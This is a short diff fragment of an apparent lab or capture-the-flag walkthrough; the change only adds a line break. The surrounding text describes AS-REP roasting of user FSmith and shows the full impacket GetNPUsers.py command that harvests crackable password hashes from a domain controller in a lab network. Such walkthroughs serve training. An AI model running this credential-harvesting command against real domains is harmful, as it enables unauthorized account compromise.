@@ -138,6 +138,8 @@ Looks like user FSmith does not require pre-authentication.  Now we can send an 
 
 ### Exploitation
 
+<br />
+
 The impacket script GetNPUsers.py can be used from a Linux machine in order to harvest the non-preauth AS_REP responses.  We use a file with the username Fsmith  in it and output the password hash in a format that can be cracked by john:
 ```
 python /opt/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175 -usersfile docswords.txt -format john -outputfile hashes.txt
